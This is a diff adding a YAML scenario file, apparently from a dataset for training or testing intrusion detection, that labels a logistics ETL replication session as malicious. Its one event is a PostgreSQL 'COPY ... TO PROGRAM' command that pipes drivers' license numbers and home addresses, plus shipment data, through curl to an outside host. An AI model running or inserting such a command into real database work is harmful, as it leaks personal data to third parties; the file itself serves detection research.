@@ -1,0 +1,30 @@
+scenario_id: logistics_etl_exfil_mal_0001
+family_id: logistics_etl_pair_0001
+domain: logistics
+matched_pair_id: logistics_etl_pair_0001
+matched_dimensions:
+  fixed:
+  - process_tree_shape
+  - role
+  varied:
+  - sql_content
+  - connects_to_destination
+time_of_day: 01:00
+default_class: malicious
+rule_engine_relationship: agrees
+sessions:
+- session_label: replication
+  role: partner_etl_service
+  class: malicious
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 3.572882839532208
+  events:
+  - step_id: replicate
+    sql: COPY (SELECT d.license_number, d.home_address, s.dest_address, m.declared_value FROM drivers d JOIN shipments s ON s.driver_id = d.driver_id JOIN manifests m ON m.shipment_id = s.shipment_id) TO
+      PROGRAM 'curl -sX POST https://sync.example.net/push -d @-'
+    connects_to:
+      ip: 91.219.236.174
+      port: 443
